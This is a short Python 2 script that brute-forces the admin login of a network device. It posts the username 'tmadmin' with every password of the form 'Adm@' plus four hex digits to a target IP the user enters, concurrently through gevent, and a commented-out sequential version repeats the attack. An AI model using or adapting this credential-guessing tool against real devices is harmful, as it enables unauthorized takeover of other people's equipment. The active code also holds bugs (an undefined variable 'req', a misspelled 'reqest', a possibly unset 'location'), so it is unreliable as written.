#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
from requests.exceptions import ConnectionError
import gevent as g

# dapw = {}
# for x in xrange(65536):
#     backnum = len(hex(x).split('0x')[1])
#     if backnum < 4:
#         num = '0' * (4 - backnum) + hex(x).split('0x')[1]
#         dapw[x] = 'Adm@' + num.upper()
#     else:
#         num = hex(x).split('0x')[1]
#         dapw[x] = 'Adm@' + num.upper()

# target = str(raw_input('Target IP: '))
# print 'Running...'
# location = ''
# for x in xrange(65536):
#     print '\r-------> ' + str(x)
#     payload = {'LoginNameValue': 'tmadmin',
#                'LoginPasswordValue': dapw[x]}
#     try:
#         r = requests.post('http://' + target + '/Forms/TM2Auth_1',
#                           data=payload, allow_redirects=False,
#                           timeout=60)
#         location = r.headers['Location']
#     except ConnectionError, e:
#         print str(x) + ' Error!!'
#     if 'rpSys.html' in location:
#         print 'Success!! The PW is ' + dapw[x]
#         break
    
def gene(x):
    num = len(hex(x).split('0x')[1])
    if num < 4:
        res = '0' * (4 - num) + hex(x).split('0x')[1]
    else:
        res = hex(x).split('0x')[1]
    return 'Adm@' + res.upper()

def send(x, target):
    content = gene(req)
    payload = {
        'LoginNameValue' : 'tmadmin',
        'LoginPasswordValue' : content, }
    
    try:
        r = reqest.post('http://' + target + '/Forms/TM2Auth_1',
                        data=payload, allow_redirects=False,
                        timeout=60)
        location = r.headers['Location']
    except ConnectionError as e:
        print '{} is error'.format(str(content))

    if 'rpSys.html' in location:
        print 'Success!! Password is {}'.format(content)
        
if __name__ == '__main__' :
    target = str(raw_input('Target IP: '))
    g.joinall([g.spawn(send, x, target) for x in xrange(65536)])
    
